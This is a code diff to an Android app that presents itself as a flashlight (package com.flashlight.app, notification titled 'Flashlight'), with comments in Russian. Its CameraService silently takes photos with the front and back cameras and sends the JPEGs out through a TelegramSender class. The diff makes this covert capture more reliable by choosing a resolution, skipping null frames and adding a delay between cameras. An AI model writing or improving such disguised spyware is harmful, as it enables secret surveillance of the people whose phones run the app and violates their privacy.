@@ -1,4 +1,5 @@
 package com.flashlight.app;
+
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -29,6 +30,7 @@ public class CameraService extends Service {
         getSystemService(NotificationManager.class).createNotificationChannel(ch);
         Notification n = new Notification.Builder(this, "cam").setContentTitle("Flashlight").setSmallIcon(android.R.drawable.ic_menu_camera).build();
         startForeground(1, n);
+        
         manager = (CameraManager) getSystemService(CAMERA_SERVICE);
         capturePhoto("front", "1"); 
         return START_NOT_STICKY;
@@ -36,28 +38,57 @@ public class CameraService extends Service {
 
     private void capturePhoto(String tag, String id) {
         try {
+            // Узнаем правильное разрешение для конкретной камеры
+            android.hardware.camera2.params.StreamConfigurationMap map = 
+                manager.getCameraCharacteristics(id).get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
+            android.util.Size[] sizes = map.getOutputSizes(ImageFormat.YUV_420_888);
+            android.util.Size bestSize = sizes[0];
+            for (android.util.Size s : sizes) {
+                if (s.getWidth() <= 1280 && s.getHeight() <= 1280) {
+                    bestSize = s; break; // Берем разрешение не больше 720p для скорости
+                }
+            }
+
+            final int w = bestSize.getWidth();
+            final int h = bestSize.getHeight();
+
             manager.openCamera(id, new CameraDevice.StateCallback() {
                 @Override public void onOpened(CameraDevice cam) {
                     device = cam;
-                    reader = ImageReader.newInstance(640, 480, ImageFormat.YUV_420_888, 1);
+                    reader = ImageReader.newInstance(w, h, ImageFormat.YUV_420_888, 1);
                     reader.setOnImageAvailableListener(r -> {
                         Image img = r.acquireLatestImage();
+                        if (img == null) return;
+                        
                         ByteBuffer yBuffer = img.getPlanes()[0].getBuffer();
                         ByteBuffer uBuffer = img.getPlanes()[1].getBuffer();
                         ByteBuffer vBuffer = img.getPlanes()[2].getBuffer();
                         int ySize = yBuffer.remaining();
                         int uSize = uBuffer.remaining();
                         int vSize = vBuffer.remaining();
+                        
                         byte[] nv21 = new byte[ySize + uSize + vSize];
                         yBuffer.get(nv21, 0, ySize);
                         vBuffer.get(nv21, ySize, vSize);
                         uBuffer.get(nv21, ySize + vSize, uSize);
-                        YuvImage yuvImage = new YuvImage(nv21, ImageFormat.NV21, 640, 480, null);
+                        
+                        YuvImage yuvImage = new YuvImage(nv21, ImageFormat.NV21, w, h, null);
                         ByteArrayOutputStream out = new ByteArrayOutputStream();
-                        yuvImage.compressToJpeg(new Rect(0, 0, 640, 480), 90, out);
+                        yuvImage.compressToJpeg(new Rect(0, 0, w, h), 90, out);
+                        
                         new TelegramSender().send(out.toByteArray(), tag + ".jpg");
+                        
                         img.close(); r.close(); device.close();
-                        if (tag.equals("front")) capturePhoto("back", "0"); else stopSelf();
+                        
+                        // Небольшая задержка, чтобы система освободила камеру
+                        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                            if (tag.equals("front")) {
+                                capturePhoto("back", "0");
+                            } else {
+                                stopSelf();
+                            }
+                        }, 1000); // 1 секунда паузы
+                        
                     }, null);
                     try {
                         builder = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
